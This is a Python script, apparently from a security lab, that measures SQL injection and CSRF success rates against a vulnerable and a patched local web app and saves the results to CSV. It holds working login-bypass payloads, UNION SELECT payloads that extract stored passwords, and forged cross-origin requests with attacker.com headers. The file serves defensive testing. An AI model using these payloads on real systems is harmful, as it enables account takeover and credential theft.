#!/usr/bin/env python3
"""
Metrics Collection Framework
Collects attack success rates and generates CSV results for experiments E1-E4
"""

import csv
import time
import requests
from datetime import datetime
from pathlib import Path

class MetricsCollector:
    def __init__(self, results_dir='../results'):
        self.results_dir = Path(results_dir)
        self.results_dir.mkdir(parents=True, exist_ok=True)

    def test_sqli_auth_bypass(self, base_url, payload):
        """
        Test SQL injection authentication bypass
        Returns (success, response_time, details)
        """
        start_time = time.time()

        try:
            response = requests.post(
                f"{base_url}/api/login",
                data={'username': payload, 'password': 'anything'},
                allow_redirects=False,
                timeout=5
            )
            response_time = (time.time() - start_time) * 1000  # ms

            data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}

            # Determine if attack succeeded
            if data.get('success') or (response.status_code == 302 and '/dashboard' in response.headers.get('Location', '')):
                return True, response_time, "Login bypass successful"
            elif 'error' in data.get('message', '').lower() or 'sqlite' in str(data):
                return False, response_time, "SQL error (vulnerability exists but login failed)"
            else:
                return False, response_time, "Attack blocked"

        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return False, response_time, f"Request failed: {str(e)}"

    def test_sqli_data_exfiltration(self, base_url, username, password, payload):
        """
        Test SQL injection data exfiltration via search
        Returns (success, response_time, details)
        """
        # First login
        session = requests.Session()
        try:
            session.post(f"{base_url}/api/login",
                        data={'username': username, 'password': password})
        except Exception:
            return False, 0, "Login failed"

        start_time = time.time()

        try:
            response = session.get(
                f"{base_url}/api/search",
                params={'query': payload},
                timeout=5
            )
            response_time = (time.time() - start_time) * 1000  # ms

            data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}

            # Check if sensitive data was exposed
            response_text = str(data).lower()
            if 'admin_secret' in response_text or ('password' in response_text and 'results' in data):
                return True, response_time, "Data exfiltration successful - passwords exposed"
            elif 'error' in response_text or 'sql' in response_text:
                return False, response_time, "SQL error but no data exposed"
            else:
                return False, response_time, "Attack blocked"

        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return False, response_time, f"Request failed: {str(e)}"

    def test_csrf_attack(self, base_url, username, password, attack_type='profile_update'):
        """
        Test CSRF attack
        Returns (success, response_time, details)
        """
        # Login to establish session
        session = requests.Session()
        try:
            session.post(f"{base_url}/api/login",
                        data={'username': username, 'password': password})
        except Exception:
            return False, 0, "Login failed"

        start_time = time.time()

        try:
            # Simulate CSRF attack (no token, cross-origin headers)
            if attack_type == 'profile_update':
                response = session.post(
                    f"{base_url}/api/update_profile_csrf",
                    data={'email': 'csrf_test@attacker.com', 'bio': 'CSRF attack test'},
                    headers={
                        'Origin': 'http://attacker.com',
                        'Referer': 'http://attacker.com/evil.html'
                    },
                    timeout=5
                )
            else:  # add_friend
                response = session.post(
                    f"{base_url}/api/add_friend",
                    data={'friend_username': 'bob'},
                    headers={
                        'Origin': 'http://attacker.com',
                        'Referer': 'http://attacker.com/evil.html'
                    },
                    timeout=5
                )

            response_time = (time.time() - start_time) * 1000  # ms

            # Check if CSRF attack succeeded or was blocked
            if response.status_code == 403:
                return False, response_time, "CSRF protection active - 403 Forbidden"
            elif response.status_code in [200, 302]:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                if data.get('success'):
                    if 'csrf' in data.get('message', '').lower() and 'failed' in data.get('message', '').lower():
                        return False, response_time, "CSRF token validation failed"
                    else:
                        return True, response_time, "CSRF attack succeeded"
                else:
                    return False, response_time, data.get('message', 'Attack blocked')
            else:
                return False, response_time, f"Unexpected status: {response.status_code}"

        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return False, response_time, f"Request failed: {str(e)}"

    def run_experiment_e1(self, vulnerable_url, patched_url, num_trials=20):
        """
        E1: SQLi Authentication Bypass
        Test multiple payloads against both apps
        """
        print("\n" + "=" * 70)
        print("EXPERIMENT E1: SQL Injection Authentication Bypass")
        print("=" * 70)

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' OR 1=1 --",
            "') OR ('1'='1",
        ]

        results = []

        for trial in range(1, num_trials + 1):
            payload = payloads[(trial - 1) % len(payloads)]

            print(f"\nTrial {trial}/{num_trials}: Testing payload: {payload[:30]}...")

            # Test vulnerable
            v_success, v_time, v_details = self.test_sqli_auth_bypass(vulnerable_url, payload)
            print(f"  Vulnerable: {'SUCCESS' if v_success else 'BLOCKED'} ({v_time:.2f}ms)")

            # Test patched
            p_success, p_time, p_details = self.test_sqli_auth_bypass(patched_url, payload)
            print(f"  Patched: {'SUCCESS' if p_success else 'BLOCKED'} ({p_time:.2f}ms)")

            results.append({
                'trial': trial,
                'payload': payload,
                'vulnerable_success': v_success,
                'vulnerable_time_ms': round(v_time, 2),
                'vulnerable_details': v_details,
                'patched_success': p_success,
                'patched_time_ms': round(p_time, 2),
                'patched_details': p_details,
                'timestamp': datetime.now().isoformat()
            })

        # Save to CSV
        csv_file = self.results_dir / 'e1_sqli_auth.csv'
        self.save_to_csv(results, csv_file)

        # Calculate success rates
        v_success_rate = sum(1 for r in results if r['vulnerable_success']) / len(results) * 100
        p_success_rate = sum(1 for r in results if r['patched_success']) / len(results) * 100

        print(f"\n{'=' * 70}")
        print(f"E1 Results:")
        print(f"  Vulnerable app success rate: {v_success_rate:.1f}% ({sum(1 for r in results if r['vulnerable_success'])}/{len(results)})")
        print(f"  Patched app success rate: {p_success_rate:.1f}% ({sum(1 for r in results if r['patched_success'])}/{len(results)})")
        print(f"  Results saved to: {csv_file}")
        print(f"{'=' * 70}\n")

        return results

    def run_experiment_e2(self, vulnerable_url, patched_url, num_trials=20):
        """
        E2: SQLi Data Exfiltration
        Test UNION SELECT attacks
        """
        print("\n" + "=" * 70)
        print("EXPERIMENT E2: SQL Injection Data Exfiltration")
        print("=" * 70)

        payloads = [
            "' UNION SELECT id, username, password, email FROM users --",
            "' UNION SELECT NULL, username, password, NULL FROM users --",
            "alice' UNION SELECT id, username, password, email FROM users --",
        ]

        results = []

        for trial in range(1, num_trials + 1):
            payload = payloads[(trial - 1) % len(payloads)]

            print(f"\nTrial {trial}/{num_trials}: Testing UNION SELECT...")

            # Test vulnerable
            v_success, v_time, v_details = self.test_sqli_data_exfiltration(
                vulnerable_url, 'alice', 'password123', payload
            )
            print(f"  Vulnerable: {'DATA EXPOSED' if v_success else 'BLOCKED'} ({v_time:.2f}ms)")

            # Test patched
            p_success, p_time, p_details = self.test_sqli_data_exfiltration(
                patched_url, 'alice', 'password123', payload
            )
            print(f"  Patched: {'DATA EXPOSED' if p_success else 'BLOCKED'} ({p_time:.2f}ms)")

            results.append({
                'trial': trial,
                'payload': payload,
                'vulnerable_success': v_success,
                'vulnerable_time_ms': round(v_time, 2),
                'vulnerable_details': v_details,
                'patched_success': p_success,
                'patched_time_ms': round(p_time, 2),
                'patched_details': p_details,
                'timestamp': datetime.now().isoformat()
            })

        # Save to CSV
        csv_file = self.results_dir / 'e2_sqli_data.csv'
        self.save_to_csv(results, csv_file)

        # Calculate success rates
        v_success_rate = sum(1 for r in results if r['vulnerable_success']) / len(results) * 100
        p_success_rate = sum(1 for r in results if r['patched_success']) / len(results) * 100

        print(f"\n{'=' * 70}")
        print(f"E2 Results:")
        print(f"  Vulnerable app data exposure rate: {v_success_rate:.1f}%")
        print(f"  Patched app data exposure rate: {p_success_rate:.1f}%")
        print(f"  Results saved to: {csv_file}")
        print(f"{'=' * 70}\n")

        return results

    def run_experiment_e3(self, vulnerable_url, patched_url, num_trials=20):
        """
        E3: CSRF Attacks
        Test CSRF on profile update and add friend
        """
        print("\n" + "=" * 70)
        print("EXPERIMENT E3: CSRF Attacks")
        print("=" * 70)

        attack_types = ['profile_update', 'add_friend']
        results = []

        for trial in range(1, num_trials + 1):
            attack_type = attack_types[(trial - 1) % len(attack_types)]

            print(f"\nTrial {trial}/{num_trials}: Testing CSRF {attack_type}...")

            # Test vulnerable
            v_success, v_time, v_details = self.test_csrf_attack(
                vulnerable_url, 'alice', 'password123', attack_type
            )
            print(f"  Vulnerable: {'EXPLOITED' if v_success else 'BLOCKED'} ({v_time:.2f}ms)")

            # Test patched
            p_success, p_time, p_details = self.test_csrf_attack(
                patched_url, 'alice', 'password123', attack_type
            )
            print(f"  Patched: {'EXPLOITED' if p_success else 'BLOCKED'} ({p_time:.2f}ms)")

            results.append({
                'trial': trial,
                'attack_type': attack_type,
                'vulnerable_success': v_success,
                'vulnerable_time_ms': round(v_time, 2),
                'vulnerable_details': v_details,
                'patched_success': p_success,
                'patched_time_ms': round(p_time, 2),
                'patched_details': p_details,
                'timestamp': datetime.now().isoformat()
            })

        # Save to CSV
        csv_file = self.results_dir / 'e3_csrf.csv'
        self.save_to_csv(results, csv_file)

        # Calculate success rates
        v_success_rate = sum(1 for r in results if r['vulnerable_success']) / len(results) * 100
        p_success_rate = sum(1 for r in results if r['patched_success']) / len(results) * 100

        print(f"\n{'=' * 70}")
        print(f"E3 Results:")
        print(f"  Vulnerable app CSRF success rate: {v_success_rate:.1f}%")
        print(f"  Patched app CSRF success rate: {p_success_rate:.1f}%")
        print(f"  Results saved to: {csv_file}")
        print(f"{'=' * 70}\n")

        return results

    def save_to_csv(self, results, filename):
        """Save results to CSV file"""
        if not results:
            return

        with open(filename, 'w', newline='') as csvfile:
            fieldnames = results[0].keys()
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

            writer.writeheader()
            for row in results:
                writer.writerow(row)

def main():
    """Main function"""
    print("\n" + "=" * 70)
    print("Security Metrics Collection Framework")
    print("=" * 70)

    vulnerable_url = input("\nEnter vulnerable app URL (default: http://localhost:5000): ").strip() or "http://localhost:5000"
    patched_url = input("Enter patched app URL (default: http://localhost:5001): ").strip() or "http://localhost:5001"
    num_trials = int(input("Number of trials per experiment (default: 20): ").strip() or "20")

    collector = MetricsCollector()

    # Run experiments
    print("\nRunning experiments...")
    print("This will test SQL Injection and CSRF attacks on both vulnerable and patched apps.\n")

    # E1: SQLi Auth
    collector.run_experiment_e1(vulnerable_url, patched_url, num_trials)

    # E2: SQLi Data
    collector.run_experiment_e2(vulnerable_url, patched_url, num_trials)

    # E3: CSRF
    collector.run_experiment_e3(vulnerable_url, patched_url, num_trials)

    print("\n" + "=" * 70)
    print("All experiments completed!")
    print(f"Results saved to: {collector.results_dir}")
    print("=" * 70 + "\n")

if __name__ == '__main__':
    main()
